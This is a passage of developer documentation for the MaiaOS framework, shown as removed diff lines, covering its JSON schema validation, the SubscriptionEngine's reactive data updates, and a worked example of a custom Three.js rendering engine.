-- `tag`: HTML tag name
-- `class`: CSS class name
-- `text`: Text content (can be expression)
-- `value`: Input value (can be expression)
-- `attrs`: HTML attributes object
-- `children`: Array of child nodes
-- `$on`: Event handlers object
-- `$each`: Loop definition
-- `$slot`: Slot reference (expression)
-
-**Example:**
-```json
-{
-  "$type": "view",
-  "$id": "co_view_todo_001",
-  "root": {
-    "tag": "div",
-    "text": "$title",
-    "children": []
-  }
-}
-```
-
-### Style Schema
-
-Validates style definitions (`.style.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"actor.style"`
-
-**Properties:**
-- `tokens`: Design tokens object
-- `components`: Component-specific styles object
-
-**Example:**
-```json
-{
-  "$type": "actor.style",
-  "tokens": {
-    "colors": {
-      "primary": "#8fa89b"
-    }
-  },
-  "components": {
-    "button": {
-      "background": "{colors.primary}"
-    }
-  }
-}
-```
-
-### Brand Style Schema
-
-Validates brand style definitions (`brand.style.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"brand.style"`
-- `$id`: Unique identifier (pattern: `^co_brand_`)
-
-**Properties:**
-- `tokens`: Design tokens (colors, spacing, typography, radii, shadows)
-- `components`: Component-specific styles
-- `selectors`: CSS selector-based styles
-
-**Example:**
-```json
-{
-  "$type": "brand.style",
-  "$id": "co_brand_001",
-  "tokens": {
-    "colors": {
-      "primary": "#8fa89b"
-    }
-  },
-  "components": {
-    "button": {
-      "background": "{colors.primary}"
-    }
-  }
-}
-```
-
-### Interface Schema
-
-Validates interface definitions (`.interface.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"actor.interface"`
-
-**Properties:**
-- `inbox`: Object mapping message types to payload schemas
-- `publishes`: Object mapping message types to payload schemas
-- `subscriptions`: Array of actor IDs
-- `watermark`: Number (default: 0)
-
-**Example:**
-```json
-{
-  "$type": "actor.interface",
-  "inbox": {
-    "CREATE_TODO": {
-      "payload": {
-        "text": "string"
-      }
-    }
-  },
-  "publishes": {
-    "TODO_CREATED": {
-      "payload": {
-        "id": "string"
-      }
-    }
-  }
-}
-```
-
-### Tool Schema
-
-Validates tool definitions (`.tool.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"tool"`
-- `$id`: Unique identifier (pattern: `^tool_`)
-- `name`: Tool identifier (pattern: `^@`)
-- `description`: Tool description
-- `parameters`: JSON Schema for tool parameters
-
-**Example:**
-```json
-{
-  "$type": "tool",
-  "$id": "tool_create_001",
-  "name": "@mutation/create",
-  "description": "Creates a new entity",
-  "parameters": {
-    "type": "object",
-    "properties": {
-      "schema": {
-        "type": "string"
-      },
-      "data": {
-        "type": "object"
-      }
-    },
-    "required": ["schema", "data"]
-  }
-}
-```
-
-### Skill Schema
-
-Validates skill definitions (`.skill.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"skill"`
-- `$id`: Unique identifier (pattern: `^skill_`)
-- `actorType`: Actor type this skill describes
-- `description`: High-level capability summary
-- `stateEvents`: Events the actor can handle
-- `queryableContext`: Context fields AI can read
-
-**Optional fields:**
-- `version`: Skill version
-- `capabilities`: High-level capability categories
-- `bestPractices`: Guidelines for AI agents
-- `commonPatterns`: Reusable interaction sequences
-- `examples`: Usage examples
-
-**Example:**
-```json
-{
-  "$type": "skill",
-  "$id": "skill_todo_001",
-  "actorType": "todo",
-  "description": "Todo list manager",
-  "stateEvents": {
-    "CREATE_TODO": {
-      "description": "Create a new todo",
-      "payload": {
-        "text": {
-          "type": "string",
-          "required": true
-        }
-      }
-    }
-  },
-  "queryableContext": {
-    "todos": {
-      "type": "array",
-      "description": "List of todos"
-    }
-  }
-}
-```
-
-### Vibe Schema
-
-Validates vibe definitions (`.vibe.maia` files).
-
-**Required fields:**
-- `$type`: Must be `"vibe"`
-- `$id`: Unique identifier (pattern: `^vibe_`)
-- `name`: Vibe name
-- `description`: Vibe description
-- `actor`: Path to actor definition file
-
-**Example:**
-```json
-{
-  "$type": "vibe",
-  "$id": "vibe_todos_001",
-  "name": "Todo List",
-  "description": "A todo list application",
-  "actor": "./vibe/vibe.actor.maia"
-}
-```
-
-### Message Schema
-
-Validates messages passed between actors.
-
-**Required fields:**
-- `type`: Message type/event name
-- `timestamp`: Unix timestamp (number, minimum: 0)
-
-**Optional fields:**
-- `payload`: Message payload data (object)
-- `from`: Sender actor ID (string)
-- `id`: Optional message ID for deduplication (string)
-
-**Example:**
-```json
-{
-  "type": "CREATE_TODO",
-  "payload": {
-    "text": "Buy milk"
-  },
-  "from": "actor_user_001",
-  "timestamp": 1234567890
-}
-```
-
-### Data Schemas
-
-Validates application data (todos, notes, etc.) stored in IndexedDB. These schemas are dynamically seeded into the database and used for runtime validation of create/update operations.
-
-**Location:** `src/schemata/data/`
-
-**Required fields:**
-- `$id`: Unique schema identifier (e.g., `"https://maiaos.dev/schemas/data/todos"`)
-- `$schema`: JSON Schema version (e.g., `"http://json-schema.org/draft-07/schema#"`)
-- `type`: Must be `"object"`
-- `properties`: Object defining field schemas
-- `required`: Array of required field names
-
-**Example - Todos Schema:**
-```json
-{
-  "$id": "https://maiaos.dev/schemas/data/todos",
-  "$schema": "http://json-schema.org/draft-07/schema#",
-  "type": "object",
-  "properties": {
-    "id": {
-      "type": "string",
-      "description": "Unique identifier for the todo item"
-    },
-    "text": {
-      "type": "string",
-      "minLength": 1,
-      "description": "The todo item text content"
-    },
-    "done": {
-      "type": "boolean",
-      "description": "Whether the todo item is completed"
-    }
-  },
-  "required": ["text", "done"],
-  "additionalProperties": false
-}
-```
-
-**How It Works:**
-
-1. **Schema Definition**: Create a JSON Schema file in `src/schemata/data/` (e.g., `todos.schema.json`)
-2. **Automatic Seeding**: Schemas are automatically seeded into IndexedDB during `MaiaOS.boot()` via the `schemata` module
-3. **Runtime Validation**: When creating or updating data, the operation loads the schema from IndexedDB and validates the data
-4. **Storage**: Schemas are stored in IndexedDB's `schemas` store with keys like `@schema/data/todos`
-
-**Adding a New Data Schema:**
-
-1. Create `src/schemata/data/yourtype.schema.json` following JSON Schema format
-2. Export it in `src/schemata/index.js`:
-   ```javascript
-   import yourtypeSchema from './data/yourtype.schema.json';
-   const DATA_SCHEMAS = {
-     'data/todos': todosSchema,
-     'data/yourtype': yourtypeSchema  // Add here
-   };
-   ```
-3. The schema will be automatically seeded and used for validation
-
-**Validation Points:**
-- **Create operations**: Full validation (all required fields must be present)
-- **Update operations**: Partial validation (only validates fields being updated, doesn't require all fields)
-- **Toggle operations**: Validates field exists and is boolean type
-
-## Common Definitions
-
-The `common.schema.json` file defines shared patterns used across multiple schemas:
-
-- **Expression**: Context reference (`$field`), item reference (`$$field`), or literal value
-- **Guard**: Guard condition for state machine transitions
-- **Action**: Tool invocation or context update
-- **Transition**: State machine transition definition
-- **MessagePayload**: Message payload definition
-
-## Integration
-
-Validation is automatically integrated into all engines:
-
-- **ActorEngine**: Validates actor, context, and interface files on load
-- **StateEngine**: Validates state machine files on load
-- **ViewEngine**: Validates view files on load
-- **StyleEngine**: Validates style files on load
-- **ToolEngine**: Validates tool definition files on load
-- **Kernel**: Validates vibe manifest files on load
-
-## Error Messages
-
-Validation errors include:
-
-- `instancePath`: JSON path to the invalid field (e.g., `/properties/name`)
-- `schemaPath`: JSON path in the schema (e.g., `/properties/name/type`)
-- `keyword`: Validation keyword that failed (e.g., `required`, `type`)
-- `message`: Human-readable error message
-- `params`: Additional error parameters
-
-**Example error:**
-```json
-{
-  "instancePath": "/properties/name",
-  "schemaPath": "#/properties/name/type",
-  "keyword": "type",
-  "message": "must be string",
-  "params": {
-    "type": "string"
-  }
-}
-```
-
-## Performance
-
-- Schemas are compiled once and cached
-- Validation is fast (< 1ms per file typically)
-- Validation only occurs on file load, not at runtime
-
-## Extending Schemas
-
-To add a new schema:
-
-1. Create `src/schemata/newtype.schema.json`
-2. Add schema to `src/schemata/index.js` exports
-3. Update `validation.helper.js` to load the new schema
-4. Add validation calls in the appropriate engine
-
-## Best Practices
-
-1. **Be permissive initially**: Start with schemas that accept current data, tighten later
-2. **Use clear descriptions**: Add `title` and `description` fields for better error messages
-3. **Reuse common definitions**: Extract shared patterns into `common.schema.json`
-4. **Test against real data**: Use integration tests to validate all existing files
-5. **Version schemas**: Include `$schema` field pointing to JSON Schema spec
-
----
-
-# 04_ENGINES
-
-*Source: developers/04_engines.md*
-
-# Engines Guide (Developer)
-
-**For developers** who want to create custom engines to extend MaiaOS capabilities.
-
-## What Are Engines?
-
-Engines are the **execution machinery** of MaiaOS. They interpret declarative definitions and execute imperative operations.
-
-### Built-in Engines
-
-| Engine | Purpose | Input | Output |
-|--------|---------|-------|--------|
-| `ActorEngine` | Actor lifecycle | Actor definitions | Running actors |
-| `SubscriptionEngine` | Reactive data | Context query objects | Auto-updating context |
-| `StateEngine` | State machines | State definitions + events | State transitions |
-| `ViewEngine` | UI rendering | View definitions | Shadow DOM |
-| `ToolEngine` | Action execution | Tool names + payloads | Side effects |
-| `StyleEngine` | Style compilation | Style definitions | CSS |
-| `DBEngine` | Database operations | @db tool payloads | CRUD results |
-| `ModuleRegistry` | Module loading | Module names | Registered modules |
-| `MaiaScriptEvaluator` | Expression eval | DSL expressions | Evaluated values |
-
-## Engine Architecture
-
-### Core Responsibilities
-
-1. **Interpret Definitions** - Parse and validate DSL using JSON schemas
-2. **Execute Operations** - Perform imperative actions
-3. **Manage State** - Track runtime state (not actor state!)
-4. **Handle Errors** - Graceful failure and recovery
-5. **Emit Events** - Notify other engines (if needed)
-
-All engines automatically validate their input data against JSON schemas when loading definitions. See [Schema System](./03_schemas.md) for details.
-
-## Validation System
-
-MaiaOS implements **end-to-end JSON Schema validation** across all data operations. Every piece of data flowing through the system is validated against its schema definition.
-
-### Validation Coverage
-
-**Config Files** (100% validated):
-- Actors, Contexts, States, Views, Styles, Interfaces, Vibes
-- Validated when loaded from IndexedDB using AJV
-- Validation happens in respective engines (ActorEngine, StateEngine, ViewEngine, etc.)
-
-**Tool Payloads** (100% validated):
-- Full JSON Schema validation for all tool parameters
-- Validated in `ToolEngine.execute()` before tool execution
-- Uses `validateOrThrow()` helper with AJV
-
-**Message Payloads** (100% validated):
-- Full JSON Schema validation for all message payloads
-- Validated in `ActorEngine._validateMessage()` for both inbox and publishes
-- Converts interface payload format to JSON Schema automatically
-
-**Application Data** (100% validated):
-- Create operations: Full validation against data schema from IndexedDB
-- Update operations: Partial validation (only fields being updated)
-- Toggle operations: Validates field exists and is boolean type
-- Schemas stored in IndexedDB `schemas` store (e.g., `@schema/data/todos`)
-
-### How Validation Works
-
-1. **Schema Storage**: All schemas (config schemas + data schemas) are seeded into IndexedDB during `MaiaOS.boot()`
-2. **Runtime Loading**: Operations load schemas from IndexedDB on-demand
-3. **AJV Validation**: Uses AJV (fast JSON Schema validator) for validation
-4. **Fail-Fast**: Validation errors throw immediately with clear, actionable error messages
-
-### Example: Tool Payload Validation
-
-```javascript
-// Tool definition (.tool.maia)
-{
-  "parameters": {
-    "type": "object",
-    "properties": {
-      "text": { "type": "string", "minLength": 1 }
-    },
-    "required": ["text"]
-  }
-}
-
-// Tool execution validates payload
-await toolEngine.execute('@core/createTodo', actor, { text: "Buy milk" });
-// ✅ Valid - passes validation
-
-await toolEngine.execute('@core/createTodo', actor, { text: "" });
-// ❌ Invalid - throws: "Validation failed: text should NOT be shorter than 1 characters"
-```
-
-### Example: Message Payload Validation
-
-```javascript
-// Interface definition (.interface.maia)
-{
-  "inbox": {
-    "CREATE_TODO": {
-      "payload": { "text": "string" }
-    }
-  }
-}
-
-// Message validation converts to JSON Schema and validates
-await actorEngine.sendMessage(actorId, {
-  type: "CREATE_TODO",
-  payload: { text: "Buy milk" }
-});
-// ✅ Valid - passes validation
-
-await actorEngine.sendMessage(actorId, {
-  type: "CREATE_TODO",
-  payload: { text: 123 }
-});
-// ❌ Invalid - throws: "Validation failed: text should be string"
-```
-
-### Example: Application Data Validation
-
-```javascript
-// Data schema (todos.schema.json) stored in IndexedDB
-{
-  "properties": {
-    "text": { "type": "string", "minLength": 1 },
-    "done": { "type": "boolean" }
-  },
-  "required": ["text", "done"]
-}
-
-// Create operation validates data
-await maia.db({
-  op: 'create',
-  schema: '@schema/todos',
-  data: { text: "Buy milk", done: false }
-});
-// ✅ Valid - passes validation
-
-await maia.db({
-  op: 'create',
-  schema: '@schema/todos',
-  data: { text: "", done: false }
-});
-// ❌ Invalid - throws: "Validation failed: text should NOT be shorter than 1 characters"
-```
-
-### Validation Error Messages
-
-Validation errors provide clear, actionable feedback:
-
-```
-Validation failed for 'tool-payload' in tool-payload:
-  - /text: should NOT be shorter than 1 characters
-  - /done: should be boolean
-```
-
-### Performance
-
-- AJV compiles schemas for fast validation (< 1ms per validation)
-- Schemas are cached after first load
-- Validation only occurs at operation boundaries (not on every property access)
-
-For more details, see [Validation Guide](./10_validation.md).
-
-### SubscriptionEngine - Context-Driven Reactivity
-
-**SubscriptionEngine** is the central reactive system that makes data automatically update your UI. It's the "magic" behind automatic re-rendering when data changes.
-
-#### What It Does
-
-**The problem it solves:** You want your UI to automatically update when data changes, without writing manual subscription code.
-
-**How it works:**
-
-1. **Scans actor context** - When an actor is created, SubscriptionEngine looks at its context
-2. **Identifies query objects** - Finds objects with a `schema` field (e.g., `{ "schema": "@schema/todos", "filter": null }`)
-3. **Auto-subscribes** - Creates database subscriptions for each query object
-4. **Updates context** - When data changes, updates `actor.context[key]` with new data
-5. **Triggers re-renders** - Schedules actor re-render (batched in microtask)
-6. **Cleans up** - Unsubscribes when actor is destroyed (prevents memory leaks)
-
-#### Architecture
-
-**Location:** `libs/maia-script/src/o/engines/subscription-engine/subscription.engine.js`
-
-```javascript
-export class SubscriptionEngine {
-  constructor(dbEngine, actorEngine) {
-    this.dbEngine = dbEngine;
-    this.actorEngine = actorEngine;
-    this.pendingRerenders = new Set();  // Batching system
-    this.batchTimer = null;
-    this.debugMode = true;
-  }
-  
-  // Initialize subscriptions for an actor
-  async initialize(actor) {
-    await this._subscribeToContext(actor);
-  }
-  
-  // Watch context for query objects
-  async _subscribeToContext(actor) {
-    for (const [key, value] of Object.entries(actor.context)) {
-      // Query object → reactive subscription
-      if (value?.schema?.startsWith('@')) {
-        const unsubscribe = await this.dbEngine.execute({
-          op: 'query',
-          schema: value.schema,
-          filter: value.filter || null,
-          callback: (data) => this._handleDataUpdate(actor.id, key, data)
-        });
-        
-        actor._subscriptions.push(unsubscribe);
-      }
-    }
-  }
-  
-  // Handle data updates
-  _handleDataUpdate(actorId, contextKey, data) {
-    const actor = this.actorEngine.getActor(actorId);
-    if (!actor) return;
-    
-    // Deduplication check
-    if (this._isSameData(actor.context[contextKey], data)) {
-      return; // Skip if data hasn't changed
-    }
-    
-    // Update context
-    actor.context[contextKey] = data;
-    
-    // Schedule batched re-render
-    if (actor._initialRenderComplete) {
-      this._scheduleRerender(actorId);
-    }
-  }
-  
-  // Batching system
-  _scheduleRerender(actorId) {
-    this.pendingRerenders.add(actorId);
-    
-    if (!this.batchTimer) {
-      this.batchTimer = queueMicrotask(() => {
-        this._flushRerenders();
-      });
-    }
-  }
-  
-  _flushRerenders() {
-    const actorIds = Array.from(this.pendingRerenders);
-    this.pendingRerenders.clear();
-    this.batchTimer = null;
-    
-    for (const actorId of actorIds) {
-      this.actorEngine.rerender(actorId);
-    }
-  }
-  
-  // Cleanup
-  cleanup(actor) {
-    actor._subscriptions.forEach(unsubscribe => unsubscribe());
-    actor._subscriptions = [];
-    this.pendingRerenders.delete(actor.id);
-  }
-}
-```
-
-#### Integration with ActorEngine
-
-**In ActorEngine:**
-
-```javascript
-class ActorEngine {
-  constructor(styleEngine, viewEngine, ..., subscriptionEngine) {
-    // ... other initialization
-    this.subscriptionEngine = subscriptionEngine;
-  }
-  
-  async createActor(actorPath, container, os) {
-    // ... create actor instance
-    
-    // Initialize subscriptions
-    if (this.subscriptionEngine) {
-      await this.subscriptionEngine.initialize(actor);
-    }
-    
-    // ... render view
-  }
-  
-  destroyActor(actorId) {
-    const actor = this.actors.get(actorId);
-    if (actor) {
-      // Cleanup subscriptions
-      if (this.subscriptionEngine) {
-        this.subscriptionEngine.cleanup(actor);
-      }
-      // ... rest of cleanup
-    }
-  }
-}
-```
-
-#### Query Object Format
-
-A **query object** in context declares a reactive data subscription:
-
-```json
-{
-  "todos": {
-    "schema": "@schema/todos",
-    "filter": null
-  }
-}
-```
-
-**Properties:**
-- `schema` (required): Database collection ID (must start with `@`)
-- `filter` (optional): Filter criteria (null = get all)
-
-**Examples:**
-
-```json
-// All todos
-{ "schema": "@schema/todos", "filter": null }
-
-// Incomplete todos only
-{ "schema": "@schema/todos", "filter": { "done": false } }
-
-// Completed todos only
-{ "schema": "@schema/todos", "filter": { "done": true } }
-```
-
-#### Batching and Deduplication
-
-**Batching** - Multiple updates in quick succession are batched into a single re-render:
-
-```
-Update 1 → Schedule re-render (microtask)
-Update 2 → Already scheduled, add to batch
-Update 3 → Already scheduled, add to batch
-  ↓
-Microtask runs → Re-render ONCE
-```
-
-**Result:** 3 updates = 1 re-render (instead of 3 re-renders)
-
-**Deduplication** - If data hasn't changed, skip re-render:
-
-```javascript
-// Old: [{ id: "1", text: "Buy milk" }]
-// New: [{ id: "1", text: "Buy milk" }]
-// Result: Skip re-render (data is the same)
-```
-
-**Result:** No unnecessary re-renders!
-
-#### Debug Logging
-
-SubscriptionEngine logs all operations in development mode:
-
-```javascript
-[SubscriptionEngine] Initialized
-[SubscriptionEngine] Initializing actor_list_001
-[SubscriptionEngine] ✅ actor_list_001 → @schema/todos → $todos
-[SubscriptionEngine] actor_list_001 initialized with 1 subscription(s)
-[SubscriptionEngine] 📥 actor_list_001.$todos initial data (3)
-[SubscriptionEngine] 🔄 actor_list_001.$todos updated (4)
-[SubscriptionEngine] 🎨 Batched re-render: 1 actor(s) [actor_list_001]
-```
-
-**Emoji legend:**
-- ✅ Subscription created
-- 📥 Initial data received
-- 🔄 Data updated
-- ⏭️ Skipped (no change)
-- 🎨 Re-rendering
-- 🧹 Cleaning up
-
-#### Why This Architecture?
-
-**Before (scattered subscriptions):**
-- Subscription logic in ActorEngine, StateEngine, query tools
-- Manual subscription tracking
-- Memory leaks from forgotten unsubscribes
-- Inconsistent patterns
-- Hard to debug
-
-**After (centralized SubscriptionEngine):**
-- ✅ All reactivity in one place
-- ✅ Context-driven (declarative)
-- ✅ Automatic cleanup (no memory leaks)
-- ✅ Batched re-renders (performance)
-- ✅ Deduplicated updates (efficiency)
-- ✅ Clean debug logs (visibility)
-- ✅ Future-ready (CoJSON migration)
-
-**Key insight:** Actors never think about subscriptions. They just declare what data they need in context, and SubscriptionEngine handles everything.
-
-See [Reactive Data System](./06_reactive-queries.md) for detailed usage examples.
-
-### Engine Interface Pattern
-
-```javascript
-class CustomEngine {
-  constructor(dependencies) {
-    // Store dependencies (other engines, registries)
-    this.evaluator = dependencies.evaluator;
-    this.registry = new Map();  // Internal state
-  }
-  
-  // Primary operations
-  async initialize() {...}
-  async execute(...args) {...}
-  
-  // State management
-  register(id, definition) {...}
-  get(id) {...}
-  
-  // Cleanup
-  destroy(id) {...}
-}
-```
-
-## Creating a Custom Engine
-
-### Example: ThreeJS Rendering Engine
-
-**Goal:** Render 3D scenes alongside 2D UI actors.
-
-#### 1. Define DSL Schema
-
-```json
-{
-  "$type": "scene",
-  "$id": "scene_cube_001",
-  
-  "camera": {
-    "type": "perspective",
-    "fov": 75,
-    "position": [0, 0, 5]
-  },
-  
-  "objects": [
-    {
-      "type": "mesh",
-      "geometry": "box",
-      "material": {
-        "color": "$primaryColor"
-      },
-      "position": [0, 0, 0],
-      "rotation": [0, "$rotation", 0]
-    }
-  ],
-  
-  "lights": [
-    {
-      "type": "ambient",
-      "color": 0xffffff,
-      "intensity": 0.5
-    }
-  ]
-}
-```
-
-#### 2. Implement Engine
-
-```javascript
-// o/engines/ThreeJSEngine.js
-import * as THREE from 'three';
-
-export class ThreeJSEngine {
-  constructor(evaluator) {
-    this.evaluator = evaluator;
-    this.scenes = new Map();
-    this.renderers = new Map();
-    this.animationLoops = new Map();
-  }
-  
-  /**
-   * Create and register a 3D scene
-   */
-  async createScene(sceneId, sceneDef, container, actor) {
-    // Validate definition
-    if (sceneDef.$type !== 'scene') {
-      throw new Error('Invalid scene definition');
-    }
-    
-    // Initialize Three.js
-    const scene = new THREE.Scene();
-    const camera = this._createCamera(sceneDef.camera);
-    const renderer = new THREE.WebGLRenderer({ antialias: true });
-    
-    renderer.setSize(container.clientWidth, container.clientHeight);
-    container.appendChild(renderer.domElement);
-    
-    // Create objects (evaluate context references)
-    for (const objDef of sceneDef.objects) {
-      const obj = await this._createObject(objDef, actor.context);
-      scene.add(obj);
-    }
-    
-    // Create lights
-    for (const lightDef of sceneDef.lights) {
-      const light = this._createLight(lightDef);
-      scene.add(light);
-    }
-    
-    // Store scene data
-    this.scenes.set(sceneId, {
-      scene,
-      camera,
-      renderer,
-      definition: sceneDef,
-      actor,
-      container
-    });
-    
-    this.renderers.set(sceneId, renderer);
-    
-    // Start render loop
-    this._startRenderLoop(sceneId);
-    
-    console.log(`✅ Created 3D scene: ${sceneId}`);
-    return sceneId;
-  }
-  
-  /**
-   * Update scene based on actor context changes
-   */
-  async updateScene(sceneId) {
-    const sceneData = this.scenes.get(sceneId);
-    if (!sceneData) return;
-    
-    const { scene, definition, actor } = sceneData;
-    
-    // Re-evaluate object properties with current context
-    scene.children.forEach((child, index) => {
-      if (index < definition.objects.length) {
-        const objDef = definition.objects[index];
-        
-        // Update rotation (evaluate $rotation from context)
-        if (objDef.rotation) {
-          const rotation = objDef.rotation.map(
-            r => typeof r === 'string' && r.startsWith('$')
-              ? actor.context[r.slice(1)]
-              : r
-          );
-          child.rotation.set(...rotation);
-        }
-        
-        // Update material color (evaluate $primaryColor)
-        if (objDef.material?.color && typeof objDef.material.color === 'string') {
-          const color = this.evaluator.evaluate(
-            objDef.material.color,
-            { context: actor.context }
-          );
-          child.material.color.set(color);
-        }
-      }
-    });
-  }
-  
-  /**
-   * Render loop
-   */
-  _startRenderLoop(sceneId) {
-    const sceneData = this.scenes.get(sceneId);
-    if (!sceneData) return;
-    
-    const { scene, camera, renderer } = sceneData;
-    
-    const animate = () => {
-      const loopId = requestAnimationFrame(animate);
-      this.animationLoops.set(sceneId, loopId);
-      
-      renderer.render(scene, camera);
-    };
-    
-    animate();
-  }
-  
-  /**
-   * Cleanup
-   */
-  destroyScene(sceneId) {
-    // Stop animation loop
-    const loopId = this.animationLoops.get(sceneId);
-    if (loopId) {
-      cancelAnimationFrame(loopId);
-      this.animationLoops.delete(sceneId);
-    }
-    
-    // Dispose Three.js resources
-    const sceneData = this.scenes.get(sceneId);
-    if (sceneData) {
-      sceneData.scene.traverse(obj => {
-        if (obj.geometry) obj.geometry.dispose();
-        if (obj.material) obj.material.dispose();
-      });
-      sceneData.renderer.dispose();
-      sceneData.container.removeChild(sceneData.renderer.domElement);
-    }
-    
-    // Remove from registry
-    this.scenes.delete(sceneId);
-    this.renderers.delete(sceneId);
-    
-    console.log(`🗑️ Destroyed scene: ${sceneId}`);
-  }
-  
-  // Helper methods
-  _createCamera(cameraDef) {
-    const { type, fov, position } = cameraDef;
-    if (type === 'perspective') {
-      const camera = new THREE.PerspectiveCamera(fov, window.innerWidth / window.innerHeight, 0.1, 1000);
-      camera.position.set(...position);
-      return camera;
-    }
-    throw new Error(`Unknown camera type: ${type}`);
-  }
-  
-  async _createObject(objDef, context) {
-    // Evaluate material color (may reference context)
-    let color = objDef.material?.color;
-    if (typeof color === 'string' && color.startsWith('$')) {
-      color = context[color.slice(1)];
-    }
-    
-    // Create geometry
-    let geometry;
-    if (objDef.geometry === 'box') {
-      geometry = new THREE.BoxGeometry(1, 1, 1);
-    } else if (objDef.geometry === 'sphere') {
-      geometry = new THREE.SphereGeometry(1, 32, 32);
-    }
-    
-    // Create material
-    const material = new THREE.MeshStandardMaterial({ color });
-    
-    // Create mesh
-    const mesh = new THREE.Mesh(geometry, material);
-    mesh.position.set(...objDef.position);
-    
-    // Evaluate rotation (may reference context)
-    const rotation = objDef.rotation.map(
-      r => typeof r === 'string' && r.startsWith('$')
-        ? context[r.slice(1)]
-        : r
-    );
-    mesh.rotation.set(...rotation);
-    
-    return mesh;
-  }
-  
-  _createLight(lightDef) {
-    if (lightDef.type === 'ambient') {
-      return new THREE.AmbientLight(lightDef.color, lightDef.intensity);
-    }
-    if (lightDef.type === 'directional') {
-      const light = new THREE.DirectionalLight(lightDef.color, lightDef.intensity);
-      if (lightDef.position) light.position.set(...lightDef.position);
-      return light;
-    }
-    throw new Error(`Unknown light type: ${lightDef.type}`);
-  }
-}
-```
-
-#### 3. Integrate with Kernel
-
-```javascript
-// o/kernel.js
-import { ThreeJSEngine } from './engines/ThreeJSEngine.js';
-
-export class MaiaOS {
-  static async boot(config) {
-    const os = {...};
-    
-    // Initialize existing engines
-    os.evaluator = new MaiaScriptEvaluator(os.moduleRegistry);
-    // ... other engines ...
-    
-    // Initialize ThreeJS engine
-    os.threeEngine = new ThreeJSEngine(os.evaluator);
-    
-    return os;
-  }
-}
-```
-
-#### 4. Update Actor Creation
-
-```javascript
-// o/engines/ActorEngine.js
-async createActor(actorPath, container, os) {
-  // ... load actor definition ...
-  
-  // Load scene if present
-  if (actorDef.sceneRef) {
-    const scenePath = `${basePath}/${actorDef.sceneRef}.scene.maia`;
-    const sceneDef = await this._loadJSON(scenePath);
-    actor.sceneDef = sceneDef;
-    
-    // Create 3D scene
-    await os.threeEngine.createScene(
-      sceneDef.$id,
-      sceneDef,
-      sceneContainer,
-      actor
-    );
-  }
-  
-  // ... rest of actor creation ...
-}
-```
-
-#### 5. Hook into Rerender
-
-```javascript
-// o/engines/ActorEngine.js
-async rerender(actor) {
-  // Re-render view (2D UI)
-  if (actor.viewDef && actor.container.shadowRoot) {
-    this.viewEngine.render(actor.container, actor.viewDef, actor, this);
-  }
-  
-  // Update 3D scene
-  if (actor.sceneDef && this.os.threeEngine) {
-    await this.os.threeEngine.updateScene(actor.sceneDef.$id);
-  }
-  
-  console.log(`✅ Re-render complete for: ${actor.id}`);
-}
-```
-
-#### 6. Usage in Actor Definition
-
-```json
-{
-  "$type": "actor",
-  "$id": "actor_cube_001",
-  "id": "actor_cube_001",
-  
-  "stateRef": "cube",
-  "viewRef": "cubeUI",
-  "sceneRef": "cube",    // ← References cube.scene.maia
-  
-  "context": {
-    "rotation": 0,
-    "primaryColor": "#3b82f6"
-  }
-}
-```
-
-## Engine Best Practices
-
-### ✅ DO:
-
-- **Accept dependencies via constructor** - Don't use globals
-- **Validate inputs** - Check definition schemas
-- **Handle errors gracefully** - Don't crash the system
-- **Log operations** - Help debugging
-- **Clean up resources** - Implement `destroy()` methods
-- **Use evaluator for context refs** - Leverage `$` and `$$` syntax
-- **Document public API** - Clear JSDoc comments
-
-### ❌ DON'T:
-
-- **Don't store actor state** - Use `actor.context`
-- **Don't mutate definitions** - Treat as immutable
-- **Don't create global state** - Instance-based only
-- **Don't bypass other engines** - Use proper APIs
-- **Don't block the main thread** - Use Web Workers if needed
-
-## Testing Engines
-
-```javascript
-// test-three-engine.js
-import { ThreeJSEngine } from './o/engines/ThreeJSEngine.js';
-import { MaiaScriptEvaluator } from './o/engines/MaiaScriptEvaluator.js';
-
-// Mock dependencies
-const evaluator = new MaiaScriptEvaluator();
-
-// Create engine
-const threeEngine = new ThreeJSEngine(evaluator);
-
-// Test scene creation
-const sceneDef = {
-  $type: 'scene',
-  $id: 'test_scene',
-  camera: { type: 'perspective', fov: 75, position: [0, 0, 5] },
-  objects: [
-    { type: 'mesh', geometry: 'box', material: { color: '#ff0000' }, position: [0, 0, 0] }
-  ],
-  lights: [{ type: 'ambient', color: 0xffffff, intensity: 0.5 }]
-};
-
-const mockActor = {
-  context: { rotation: 0, primaryColor: '#ff0000' }
-};
-
-const container = document.createElement('div');
-document.body.appendChild(container);
-
-await threeEngine.createScene('test_scene', sceneDef, container, mockActor);
-
-// Test update
-mockActor.context.rotation = Math.PI / 4;
-await threeEngine.updateScene('test_scene');
-
-// Test cleanup
-threeEngine.destroyScene('test_scene');
-```
-
-## Advanced Patterns
-
-### Engine-to-Engine Communication
-
-```javascript
-class CustomEngine {
-  constructor(stateEngine, viewEngine) {
-    this.stateEngine = stateEngine;
-    this.viewEngine = viewEngine;
-  }
-  
-  async doSomething(actor) {
-    // Trigger state machine event
-    this.stateEngine.send(actor.machine.id, 'CUSTOM_EVENT', {
-      data: 'from engine'
-    });
-    
-    // Force UI re-render
-    await this.viewEngine.render(actor.container, actor.viewDef, actor, actor.actorEngine);
-  }
-}
-```
-
-### Async Initialization
-
-```javascript
-class DatabaseEngine {
-  constructor() {
-    this.db = null;
-    this.ready = false;
-  }
-  
-  async initialize() {
-    this.db = await openDatabase();
-    this.ready = true;
-    console.log('✅ Database engine ready');
-  }
-  
-  async query(sql) {
-    if (!this.ready) {
-      throw new Error('DatabaseEngine not initialized');
-    }
-    return await this.db.execute(sql);
-  }
-}
-
-// In kernel
-os.dbEngine = new DatabaseEngine();
-await os.dbEngine.initialize();
-```
-
-### Resource Management
-
-```javascript
-class AudioEngine {
-  constructor() {
-    this.audioContext = new AudioContext();
-    this.buffers = new Map();
-    this.sources = new Map();
-  }
-  
-  async loadSound(id, url) {
-    const response = await fetch(url);
-    const arrayBuffer = await response.arrayBuffer();
-    const audioBuffer = await this.audioContext.decodeAudioData(arrayBuffer);
-    this.buffers.set(id, audioBuffer);
-  }
-  
-  play(id) {
-    const buffer = this.buffers.get(id);
-    if (!buffer) return;
-    
-    const source = this.audioContext.createBufferSource();
-    source.buffer = buffer;
-    source.connect(this.audioContext.destination);
-    source.start(0);
-    
-    this.sources.set(id, source);
-  }
-  
-  stop(id) {
-    const source = this.sources.get(id);
-    if (source) {
-      source.stop();
